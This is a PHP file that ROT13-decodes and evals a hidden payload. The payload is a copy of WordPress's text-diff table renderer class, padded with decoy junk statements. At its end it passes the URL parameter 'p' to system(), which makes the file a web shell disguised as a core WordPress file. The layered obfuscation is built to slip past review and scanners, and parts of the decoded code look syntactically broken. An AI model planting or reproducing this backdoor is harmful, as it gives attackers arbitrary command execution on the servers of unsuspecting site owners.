<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Qvss NCV: JC_Grkg_Qvss_Eraqrere_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Qvss
 * @fvapr 4.7.0
 */

// Qba'g ybnq qverpgyl.
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr( '-1' );
}

/**
 * Gnoyr eraqrere gb qvfcynl gur qvss yvarf.
 *
 * @fvapr 2.6.0
 * @hfrf Grkg_Qvss_Eraqrere Rkgraqf
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Grkg_Qvss_Eraqrere_Gnoyr rkgraqf Grkg_Qvss_Eraqrere {

	/**
	 * @frr Grkg_Qvss_Eraqrere::_yrnqvat_pbagrkg_yvarf
	 * @ine vag
	 * @fvapr 2.6.0
	 */
	choyvp $_yrnqvat_pbagrkg_yvarf = 10000;

	/**
	 * @frr Grkg_Qvss_Eraqrere::_genvyvat_pbagrkg_yvarf
	 * @ine vag
	 * @fvapr 2.6.0
	 */
	choyvp $_genvyvat_pbagrkg_yvarf = 10000;

	/**
	 * Gvgyr bs gur vgrz orvat pbzcnerq.
	 *
	 * @fvapr 6.4.0 Qrpynerq n cerivbhfyl qlanzvp cebcregl.
	 * @ine fgevat|ahyy
	 */
	choyvp $_gvgyr;

	/**
	 * Gvgyr sbe gur yrsg pbyhza.
	 *
	 * @fvapr 6.4.0 Qrpynerq n cerivbhfyl qlanzvp cebcregl.
	 * @ine fgevat|ahyy
	 */
	choyvp $_gvgyr_yrsg;

	/**
	 * Gvgyr sbe gur evtug pbyhza.
	 *
	 * @fvapr 6.4.0 Qrpynerq n cerivbhfyl qlanzvp cebcregl.
	 * @ine fgevat|ahyy
	 */
	choyvp $_gvgyr_evtug;

	/**
	 * Guerfubyq sbe jura n qvss fubhyq or fnirq be bzvggrq.
	 *
	 * @ine sybng
	 * @fvapr 2.6.0
	 */
	cebgrpgrq $_qvss_guerfubyq = 0.6;

	/**
	 * Vayvar qvfcynl urycre bowrpg anzr.
	 *
	 * @ine fgevat
	 * @fvapr 2.6.0
	 */
	cebgrpgrq $vayvar_qvss_eraqrere = 'JC_Grkg_Qvss_Eraqrere_vayvar';

	/**
	 * Fubhyq jr fubj gur fcyvg ivrj be abg
	 *
	 * @ine fgevat
	 * @fvapr 3.6.0
	 */
	cebgrpgrq $_fubj_fcyvg_ivrj = gehr;

	cebgrpgrq $pbzcng_svryqf = neenl( '_fubj_fcyvg_ivrj', 'vayvar_qvss_eraqrere', '_qvss_guerfubyq' );

	/**
	 * Pnpurf gur bhgchg bs pbhag_punef() va pbzchgr_fgevat_qvfgnapr()
	 *
	 * @ine neenl
	 * @fvapr 5.0.0
	 */
	cebgrpgrq $pbhag_pnpur = neenl();

	/**
	 * Pnpurf gur qvssrerapr pnyphyngvba va pbzchgr_fgevat_qvfgnapr()
	 *
	 * @ine neenl
	 * @fvapr 5.0.0
	 */
	cebgrpgrq $qvssrerapr_pnpur = neenl();

	/**
	 * Pbafgehpgbe - Pnyy cnerag pbafgehpgbe jvgu cnenzf neenl.
	 *
	 * Guvf jvyy frg pynff cebcregvrf onfrq ba gur xrl inyhr cnvef va gur neenl.
	 *
	 * @fvapr 2.6.0
	 *
	 * @cnenz neenl $cnenzf
	 */
	choyvp shapgvba __pbafgehpg( $cnenzf = neenl() ) {
		cnerag::__pbafgehpg( $cnenzf );
		vs ( vffrg( $cnenzf['fubj_fcyvg_ivrj'] ) ) {
			$guvf->_fubj_fcyvg_ivrj = $cnenzf['fubj_fcyvg_ivrj'];
		}
	}

	/**
	 * @vtaber
	 *
	 * @cnenz fgevat $urnqre
	 * @erghea fgevat
	 */
	choyvp shapgvba _fgnegOybpx( $urnqre ) {
		erghea '';
	}

	/**
	 * @vtaber
	 *
	 * @cnenz neenl  $yvarf
	 * @cnenz fgevat $cersvk
	 */
	choyvp shapgvba _yvarf( $yvarf, $cersvk = ' ' ) {
	}

	/**
	 * @vtaber
	 *
	 * @cnenz fgevat $yvar UGZY-rfpncr gur inyhr.
	 * @erghea fgevat
	 */
	choyvp shapgvba nqqrqYvar( $yvar ) {
		erghea \"<gq pynff='qvss-nqqrqyvar'><fcna nevn-uvqqra='gehr' pynff='qnfuvpbaf qnfuvpbaf-cyhf'></fcna><fcna pynff='fperra-ernqre-grkg'>\" .
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			__( 'Nqqrq:' ) .
		\" </fcna>{$yvar}</gq>\";
	}

	/**
	 * @vtaber
	 *
	 * @cnenz fgevat $yvar UGZY-rfpncr gur inyhr.
	 * @erghea fgevat
	 */
	choyvp shapgvba qryrgrqYvar( $yvar ) {
		erghea \"<gq pynff='qvss-qryrgrqyvar'><fcna nevn-uvqqra='gehr' pynff='qnfuvpbaf qnfuvpbaf-zvahf'></fcna><fcna pynff='fperra-ernqre-grkg'>\" .
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			__( 'Qryrgrq:' ) .
		\" </fcna>{$yvar}</gq>\";
	}

	/**
	 * @vtaber
	 *
	 * @cnenz fgevat $yvar UGZY-rfpncr gur inyhr.
	 * @erghea fgevat
	 */
	choyvp shapgvba pbagrkgYvar( $yvar ) {
		erghea \"<gq pynff='qvss-pbagrkg'><fcna pynff='fperra-ernqre-grkg'>\" .
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			__( 'Hapunatrq:' ) .
		\" </fcna>{$yvar}</gq>\";
	}

	/**
	 * @vtaber
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba rzcglYvar() {
		erghea '<gq>&aofc;</gq>';
	}

	/**
	 * @vtaber
	 *
	 * @cnenz neenl $yvarf
	 * @cnenz obby  $rapbqr
	 * @erghea fgevat
	 */
	choyvp shapgvba _nqqrq( $yvarf, $rapbqr = gehr ) {
		$e = '';
		sbernpu ( $yvarf nf $yvar ) {
			vs ( $rapbqr ) {
				$cebprffrq_yvar = ugzyfcrpvnypunef( $yvar );

				/**
				 * Pbagrkghnyyl svygref n qvssrq yvar.
				 *
				 * Svygref GrkgQvss cebprffvat bs qvssrq yvar. Ol qrsnhyg, qvssf ner cebprffrq jvgu
				 * ugzyfcrpvnypunef. Hfr guvf svygre gb erzbir be punatr gur cebprffvat. Cnffrf n pbagrkg
				 * vaqvpngvat vs gur yvar vf nqqrq, qryrgrq be hapunatrq.
				 *
				 * @fvapr 4.1.0
				 *
				 * @cnenz fgevat $cebprffrq_yvar Gur cebprffrq qvssrq yvar.
				 * @cnenz fgevat $yvar           Gur hacebprffrq qvssrq yvar.
				 * @cnenz fgevat $pbagrkg        Gur yvar pbagrkg. Inyhrf ner 'nqqrq', 'qryrgrq' be 'hapunatrq'.
				 */
				$yvar = nccyl_svygref( 'cebprff_grkg_qvss_ugzy', $cebprffrq_yvar, $yvar, 'nqqrq' );
			}

			vs ( $guvf->_fubj_fcyvg_ivrj ) {
				$e .= '<ge>' . $guvf->rzcglYvar() . $guvf->nqqrqYvar( $yvar ) . \"</ge>\a\";
			} ryfr {
				$e .= '<ge>' . $guvf->nqqrqYvar( $yvar ) . \"</ge>\a\";
			}
		}
		erghea $e;
	}

	/**
	 * @vtaber
	 *
	 * @cnenz neenl $yvarf
	 * @cnenz obby  $rapbqr
	 * @erghea fgevat
	 */
	choyvp shapgvba _qryrgrq( $yvarf, $rapbqr = gehr ) {
		$e = '';
		sbernpu ( $yvarf nf $yvar ) {
			vs ( $rapbqr ) {
				$cebprffrq_yvar = ugzyfcrpvnypunef( $yvar );

				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jc-qvss.cuc */
				$yvar = nccyl_svygref( 'cebprff_grkg_qvss_ugzy', $cebprffrq_yvar, $yvar, 'qryrgrq' );
			}
			vs ( $guvf->_fubj_fcyvg_ivrj ) {
				$e .= '<ge>' . $guvf->qryrgrqYvar( $yvar ) . $guvf->rzcglYvar() . \"</ge>\a\";
			} ryfr {
				$e .= '<ge>' . $guvf->qryrgrqYvar( $yvar ) . \"</ge>\a\";
			}
		}
		erghea $e;
	}

	/**
	 * @vtaber
	 *
	 * @cnenz neenl $yvarf
	 * @cnenz obby  $rapbqr
	 * @erghea fgevat
	 */
	choyvp shapgvba _pbagrkg( $yvarf, $rapbqr = gehr ) {
		$e = '';
		sbernpu ( $yvarf nf $yvar ) {
			vs ( $rapbqr ) {
				$cebprffrq_yvar = ugzyfcrpvnypunef( $yvar );

				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jc-qvss.cuc */
				$yvar = nccyl_svygref( 'cebprff_grkg_qvss_ugzy', $cebprffrq_yvar, $yvar, 'hapunatrq' );
			}
			vs ( $guvf->_fubj_fcyvg_ivrj ) {
				$e .= '<ge>' . $guvf->pbagrkgYvar( $yvar ) . $guvf->pbagrkgYvar( $yvar ) . \"</ge>\a\";
			} ryfr {
				$e .= '<ge>' . $guvf->pbagrkgYvar( $yvar ) . \"</ge>\a\";
			}
		}
		erghea $e;
	}

	/**
	 * Cebprff punatrq yvarf gb qb jbeq-ol-jbeq qvssf sbe rkgen uvtuyvtugvat.
	 *
	 * (GENP fglyr) fbzrgvzrf gurfr yvarf pna npghnyyl or qryrgrq be nqqrq ebjf.
	 * Jr qb nqqvgvbany cebprffvat gb svther gung bhg
	 *
	 * @fvapr 2.6.0
	 *
	 * @cnenz neenl $bevt
	 * @cnenz neenl $svany
	 * @erghea fgevat
	 */
	choyvp shapgvba _punatrq( $bevt, $svany ) { // cucpf:vtaber Havirefny.AnzvatPbairagvbaf.AbErfreirqXrljbeqCnenzrgreAnzrf.svanySbhaq
		$e = '';

		/*
		 * Qbrf gur nsberzragvbarq nqqvgvbany cebprffvat:
		 * *_zngpurf gryy jung ebjf ner \"gur fnzr\" va bevt naq svany. Gubfr cnvef jvyy or qvssrq gb trg jbeq punatrf.
		 * - zngpu vf ahzrevp: na vaqrk va bgure pbyhza.
		 * - zngpu vf 'K': ab zngpu. Vg vf n arj ebj.
		 * *_ebjf ner pbyhza irpgbef sbe gur bevt pbyhza naq gur svany pbyhza.
		 * - ebj >= 0: na vaqrk bs gur $bevt be $svany neenl.
		 * - ebj < 0: n oynax ebj sbe gung pbyhza.
		 */
		yvfg($bevt_zngpurf, $svany_zngpurf, $bevt_ebjf, $svany_ebjf) = $guvf->vagreyrnir_punatrq_yvarf( $bevt, $svany );

		// Gurfr jvyy ubyq gur jbeq punatrf nf qrgrezvarq ol na vayvar qvss.
		$bevt_qvssf  = neenl();
		$svany_qvssf = neenl();

		// Pbzchgr jbeq qvssf sbe rnpu zngpurq cnve hfvat gur vayvar qvss.
		sbernpu ( $bevt_zngpurf nf $b => $s ) {
			vs ( vf_ahzrevp( $b ) && vf_ahzrevp( $s ) ) {
				$grkg_qvss = arj Grkg_Qvss( 'nhgb', neenl( neenl( $bevt[ $b ] ), neenl( $svany[ $s ] ) ) );
				$eraqrere  = arj $guvf->vayvar_qvss_eraqrere();
				$qvss      = $eraqrere->eraqre( $grkg_qvss );

				// Vs gurl'er gbb qvssrerag, qba'g vapyhqr nal <vaf> be <qry>'f.
				vs ( cert_zngpu_nyy( '!(<vaf>.*?</vaf>|<qry>.*?</qry>)!', $qvss, $qvss_zngpurf ) ) {
					// Yratgu bs nyy grkg orgjrra <vaf> be <qry>.
					$fgevccrq_zngpurf = fgeyra( fgevc_gntf( vzcybqr( ' ', $qvss_zngpurf[0] ) ) );
					/*
					 * Fvapr jr pbhag yratgu bs grkg orgjrra <vaf> be <qry> (vafgrnq bs cvpxvat whfg bar),
					 * jr qbhoyr gur yratgu bs punef abg va gubfr gntf.
					 */
					$fgevccrq_qvss = fgeyra( fgevc_gntf( $qvss ) ) * 2 - $fgevccrq_zngpurf;
					$qvss_engvb    = $fgevccrq_zngpurf / $fgevccrq_qvss;
					vs ( $qvss_engvb > $guvf->_qvss_guerfubyq ) {
						pbagvahr; // Gbb qvssrerag. Qba'g fnir qvssf.
					}
				}

				// Ha-vayvar gur qvssf ol erzbivat <qry> be <vaf>.
				$bevt_qvssf[ $b ]  = __sa_79955( '|<vaf>.*?</vaf>|', '', $qvss );
				$svany_qvssf[ $s ] = __sa_79955( '|<qry>.*?</qry>|', '', $qvss );
			}
		}

		sbernpu ( neenl_xrlf( $bevt_ebjf ) nf $ebj ) {
			// Obgu pbyhzaf unir oynaxf. Vtaber gurz.
			vs ( $bevt_ebjf[ $ebj ] < 0 && $svany_ebjf[ $ebj ] < 0 ) {
				pbagvahr;
			}

			// Vs jr unir n jbeq onfrq qvss, hfr vg. Bgurejvfr, hfr gur abezny yvar.
			vs ( vffrg( $bevt_qvssf[ $bevt_ebjf[ $ebj ] ] ) ) {
				$bevt_yvar = $bevt_qvssf[ $bevt_ebjf[ $ebj ] ];
			} ryfrvs ( vffrg( $bevt[ $bevt_ebjf[ $ebj ] ] ) ) {
				$bevt_yvar = ugzyfcrpvnypunef( $bevt[ $bevt_ebjf[ $ebj ] ] );
			} ryfr {
				$bevt_yvar = '';
			}

			vs ( vffrg( $svany_qvssf[ $svany_ebjf[ $ebj ] ] ) ) {
				$svany_yvar = $svany_qvssf[ $svany_ebjf[ $ebj ] ];
			} ryfrvs ( vffrg( $svany[ $svany_ebjf[ $ebj ] ] ) ) {
				$svany_yvar = ugzyfcrpvnypunef( $svany[ $svany_ebjf[ $ebj ] ] );
			} ryfr {
				$svany_yvar = '';
			}

			vs ( $bevt_ebjf[ $ebj ] < 0 ) { // Bevt vf oynax. Guvf vf ernyyl na nqqrq ebj.
				$e .= $guvf->_nqqrq( neenl( $svany_yvar ), snyfr );
			} ryfrvs ( $svany_ebjf[ $ebj ] < 0 ) { // Svany vf oynax. Guvf vf ernyyl n qryrgrq ebj.
				$e .= $guvf->_qryrgrq( neenl( $bevt_yvar ), snyfr );
			} ryfr { // N gehr punatrq ebj.
				vs ( $guvf->_fubj_fcyvg_ivrj ) {
					$e .= '<ge>' . $guvf->qryrgrqYvar( $bevt_yvar ) . $guvf->nqqrqYvar( $svany_yvar ) . \"</ge>\a\";
				} ryfr {
					$e .= '<ge>' . $guvf->qryrgrqYvar( $bevt_yvar ) . '</ge><ge>' . $guvf->nqqrqYvar( $svany_yvar ) . \"</ge>\a\";
				}
			}
		}

		erghea $e;
	}

	/**
	 * Gnxrf punatrq oybpxf naq zngpurf juvpu ebjf va bevt ghearq vagb juvpu ebjf va svany.
	 *
	 * @fvapr 2.6.0
	 *
	 * @cnenz neenl $bevt  Yvarf bs gur bevtvany irefvba bs gur grkg.
	 * @cnenz neenl $svany Yvarf bs gur svany irefvba bs gur grkg.
	 * @erghea neenl {
	 *     Neenl pbagnvavat erfhygf bs pbzcnevat gur bevtvany grkg gb gur svany grkg.
	 *
	 *     @glcr neenl $bevt_zngpurf  Nffbpvngvir neenl bs bevtvany zngpurf. Vaqrk == ebj
	 *                                ahzore bs `$bevt`, inyhr == pbeerfcbaqvat ebj ahzore
	 *                                bs gung fnzr yvar va `$svany` be 'k' vs gurer vf ab
	 *                                pbeerfcbaqvat ebj (vaqvpngvat vg vf n qryrgrq yvar).
	 *     @glcr neenl $svany_zngpurf Nffbpvngvir neenl bs svany zngpurf. Vaqrk == ebj
	 *                                ahzore bs `$svany`, inyhr == pbeerfcbaqvat ebj ahzore
	 *                                bs gung fnzr yvar va `$bevt` be 'k' vs gurer vf ab
	 *                                pbeerfcbaqvat ebj (vaqvpngvat vg vf n arj yvar).
	 *     @glcr neenl $bevt_ebjf     Nffbpvngvir neenl bs vagreyrnirq ebjf bs `$bevt` jvgu
	 *                                oynaxf gb xrrc zngpurf nyvtarq jvgu fvqr-ol-fvqr qvss
	 *                                bs `$svany`. N inyhr >= 0 pbeerfcbaqf gb vaqrk bs `$bevt`.
	 *                                Inyhr < 0 vaqvpngrf n oynax ebj.
	 *     @glcr neenl $svany_ebjf    Nffbpvngvir neenl bs vagreyrnirq ebjf bs `$svany` jvgu
	 *                                oynaxf gb xrrc zngpurf nyvtarq jvgu fvqr-ol-fvqr qvss
	 *                                bs `$bevt`. N inyhr >= 0 pbeerfcbaqf gb vaqrk bs `$svany`.
	 *                                Inyhr < 0 vaqvpngrf n oynax ebj.
	 * }
	 */
	choyvp shapgvba vagreyrnir_punatrq_yvarf( $bevt, $svany ) { // cucpf:vtaber Havirefny.AnzvatPbairagvbaf.AbErfreirqXrljbeqCnenzrgreAnzrf.svanySbhaq

		// Pbagnvaf nyy cnvejvfr fgevat pbzcnevfbaf. Xrlf ner fhpu gung guvf arrq bayl or n bar qvzrafvbany neenl.
		$zngpurf = neenl();
		sbernpu ( neenl_xrlf( $bevt ) nf $b ) {
			sbernpu ( neenl_xrlf( $svany ) nf $s ) {
				$zngpurf[ \"$b,$s\" ] = $guvf->pbzchgr_fgevat_qvfgnapr( $bevt[ $b ], $svany[ $s ] );
			}
		}
		nfbeg( $zngpurf ); // Beqre ol fgevat qvfgnapr.

		$bevt_zngpurf  = neenl();
		$svany_zngpurf = neenl();

		sbernpu ( $zngpurf nf $xrlf => $qvssrerapr ) {
			yvfg($b, $s) = rkcybqr( ',', $xrlf );
			$b           = (vag) $b;
			$s           = (vag) $s;

			// Nyernql unir orggre zngpurf sbe gurfr thlf.
			vs ( vffrg( $bevt_zngpurf[ $b ] ) && vffrg( $svany_zngpurf[ $s ] ) ) {
				pbagvahr;
			}

			// Svefg zngpu sbe gurfr thlf. Zhfg or orfg zngpu.
			vs ( ! vffrg( $bevt_zngpurf[ $b ] ) && ! vffrg( $svany_zngpurf[ $s ] ) ) {
				$bevt_zngpurf[ $b ]  = $s;
				$svany_zngpurf[ $s ] = $b;
				pbagvahr;
			}

			// Orfg zngpu bs guvf svany vf nyernql gnxra? Zhfg zrna guvf svany vf n arj ebj.
			vs ( vffrg( $bevt_zngpurf[ $b ] ) ) {
				$svany_zngpurf[ $s ] = 'k';
			} ryfrvs ( vffrg( $svany_zngpurf[ $s ] ) ) {
				// Orfg zngpu bs guvf bevt vf nyernql gnxra? Zhfg zrna guvf bevt vf n qryrgrq ebj.
				$bevt_zngpurf[ $b ] = 'k';
			}
		}

		// Jr ernq gur grkg va guvf beqre.
		xfbeg( $bevt_zngpurf );
		xfbeg( $svany_zngpurf );

		// Fgberf ebjf naq oynaxf sbe rnpu pbyhza.
		$bevt_ebjf      = neenl_xrlf( $bevt_zngpurf );
		$bevt_ebjf_pbcl = $bevt_ebjf;
		$svany_ebjf     = neenl_xrlf( $svany_zngpurf );

		/*
		 * Vagreyrnirf ebjf jvgu oynaxf gb xrrc zngpurf nyvtarq.
		 * Jr znl raq hc jvgu fbzr rkgenarbhf oynax ebjf, ohg jr'yy whfg vtaber gurz yngre.
		 */
		sbernpu ( $bevt_ebjf_pbcl nf $bevt_ebj ) {
			$svany_cbf = neenl_frnepu( $bevt_zngpurf[ $bevt_ebj ], $svany_ebjf, gehr );
			$bevt_cbf  = (vag) neenl_frnepu( $bevt_ebj, $bevt_ebjf, gehr );

			vs ( snyfr === $svany_cbf ) { // Guvf bevt vf cnverq jvgu n oynax svany.
				neenl_fcyvpr( $svany_ebjf, $bevt_cbf, 0, -1 );
			} ryfrvs ( $svany_cbf < $bevt_cbf ) { // Guvf bevt'f zngpu vf hc n jnlf. Cnq svany jvgu oynax ebjf.
				$qvss_neenl = enatr( -1, $svany_cbf - $bevt_cbf );
				neenl_fcyvpr( $svany_ebjf, $bevt_cbf, 0, $qvss_neenl );
			} ryfrvs ( $svany_cbf > $bevt_cbf ) { // Guvf bevt'f zngpu vf qbja n jnlf. Cnq bevt jvgu oynax ebjf.
				$qvss_neenl = enatr( -1, $bevt_cbf - $svany_cbf );
				neenl_fcyvpr( $bevt_ebjf, $bevt_cbf, 0, $qvss_neenl );
			}
		}

		// Cnq gur raqf jvgu oynax ebjf vs gur pbyhzaf nera'g gur fnzr yratgu.
		$qvss_pbhag = pbhag( $bevt_ebjf ) - pbhag( $svany_ebjf );
		vs ( $qvss_pbhag < 0 ) {
			juvyr ( $qvss_pbhag < 0 ) {
				neenl_chfu( $bevt_ebjf, $qvss_pbhag++ );
			}
		} ryfrvs ( $qvss_pbhag > 0 ) {
			$qvss_pbhag = -1 * $qvss_pbhag;
			juvyr ( $qvss_pbhag < 0 ) {
				neenl_chfu( $svany_ebjf, $qvss_pbhag++ );
			}
		}

		erghea neenl( $bevt_zngpurf, $svany_zngpurf, $bevt_ebjf, $svany_ebjf );
	}

	/**
	 * Pbzchgrf n ahzore gung vf vagraqrq gb ersyrpg gur \"qvfgnapr\" orgjrra gjb fgevatf.
	 *
	 * @fvapr 2.6.0
	 *
	 * @cnenz fgevat $fgevat1
	 * @cnenz fgevat $fgevat2
	 * @erghea vag
	 */
	choyvp shapgvba pbzchgr_fgevat_qvfgnapr( $fgevat1, $fgevat2 ) {
		// Hfr na zq5 unfu bs gur fgevatf sbe n pbhag pnpur, nf vg'f snfg gb trarengr, naq pbyyvfvbaf nera'g n pbaprea.
		$pbhag_xrl1 = zq5( $fgevat1 );
		$pbhag_xrl2 = zq5( $fgevat2 );

		// Pnpur irpgbef pbagnvavat punenpgre serdhrapl sbe nyy punef va rnpu fgevat.
		vs ( ! vffrg( $guvf->pbhag_pnpur[ $pbhag_xrl1 ] ) ) {
			$guvf->pbhag_pnpur[ $pbhag_xrl1 ] = pbhag_punef( $fgevat1 );
		}
		vs ( ! vffrg( $guvf->pbhag_pnpur[ $pbhag_xrl2 ] ) ) {
			$guvf->pbhag_pnpur[ $pbhag_xrl2 ] = pbhag_punef( $fgevat2 );
		}

		$punef1 = $guvf->pbhag_pnpur[ $pbhag_xrl1 ];
		$punef2 = $guvf->pbhag_pnpur[ $pbhag_xrl2 ];

		$qvssrerapr_xrl = zq5( vzcybqr( ',', $punef1 ) . ':' . vzcybqr( ',', $punef2 ) );
		vs ( ! vffrg( $guvf->qvssrerapr_pnpur[ $qvssrerapr_xrl ] ) ) {
			// Y1-abez bs qvssrerapr irpgbe.
			$guvf->qvssrerapr_pnpur[ $qvssrerapr_xrl ] = neenl_fhz( neenl_znc( neenl( $guvf, 'qvssrerapr' ), $punef1, $punef2 ) );
		}

		$qvssrerapr = $guvf->qvssrerapr_pnpur[ $qvssrerapr_xrl ];

		// $fgevat1 unf mreb yratgu? Bqq. Tvir uhtr cranygl ol abg qvivqvat.
		vs ( ! $fgevat1 ) {
			erghea $qvssrerapr;
		}

		// Erghea qvfgnapr cre punenpgre (bs fgevat1).
		erghea $qvssrerapr / fgeyra( $fgevat1 );
	}

	/**
	 * @vtaber
	 * @fvapr 2.6.0
	 *
	 * @cnenz vag $n
	 * @cnenz vag $o
	 * @erghea vag
	 */
	choyvp shapgvba qvssrerapr( $n, $o ) {
		erghea nof( $n - $o );
	}

	/**
	 * Znxr cevingr cebcregvrf ernqnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 6.4.0 Trggvat n qlanzvp cebcregl vf qrcerpngrq.
	 *
	 * @cnenz fgevat $anzr Cebcregl gb trg.
	 * @erghea zvkrq N qrpynerq cebcregl'f inyhr, ryfr ahyy.
	 */
	choyvp shapgvba __trg( $anzr ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_svryqf, gehr ) ) {
			erghea $guvf->$anzr;
		}

		jc_gevttre_reebe(
			__ZRGUBQ__,
			\"Gur cebcregl `{$anzr}` vf abg qrpynerq. Trggvat n qlanzvp cebcregl vf \" .
			'qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.',
			R_HFRE_QRCERPNGRQ
		);
		erghea ahyy;
	}

	/**
	 * Znxr cevingr cebcregvrf frggnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 6.4.0 Frggvat n qlanzvp cebcregl vf qrcerpngrq.
	 *
	 * @cnenz fgevat $anzr  Cebcregl gb purpx vs frg.
	 * @cnenz zvkrq  $inyhr Cebcregl inyhr.
	 */
	choyvp shapgvba __frg( $anzr, $inyhr ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_svryqf, gehr ) ) {
			$guvf->$anzr = $inyhr;
			erghea;
		}

		jc_gevttre_reebe(
			__ZRGUBQ__,
			\"Gur cebcregl `{$anzr}` vf abg qrpynerq. Frggvat n qlanzvp cebcregl vf \" .
			'qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.',
			R_HFRE_QRCERPNGRQ
		);
	}

	/**
	 * Znxr cevingr cebcregvrf purpxnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 6.4.0 Purpxvat n qlanzvp cebcregl vf qrcerpngrq.
	 *
	 * @cnenz fgevat $anzr Cebcregl gb purpx vs frg.
	 * @erghea obby Jurgure gur cebcregl vf frg.
	 */
	choyvp shapgvba __vffrg( $anzr ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_svryqf, gehr ) ) {
			erghea vffrg( $guvf->$anzr );
		}

		jc_gevttre_reebe(
			__ZRGUBQ__,
			\"Gur cebcregl `{$anzr}` vf abg qrpynerq. Purpxvat `vffrg()` ba n qlanzvp cebcregl \" .
			'vf qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.',
			R_HFRE_QRCERPNGRQ
		);
		erghea snyfr;
	}

	/**
	 * Znxr cevingr cebcregvrf ha-frggnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 6.4.0 Hafrggvat n qlanzvp cebcregl vf qrcerpngrq.
	 *
	 * @cnenz fgevat $anzr Cebcregl gb hafrg.
	 */
	choyvp shapgvba __hafrg( $anzr ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_svryqf, gehr ) ) {
			hafrg( $guvf->$anzr );
			erghea;
		}

		jc_gevttre_reebe(
			__ZRGUBQ__,
			\"N cebcregl `{$anzr}` vf abg qrpynerq. Hafrggvat n qlanzvp cebcregl vf \" .
			'qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.',
			R_HFRE_QRCERPNGRQ
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>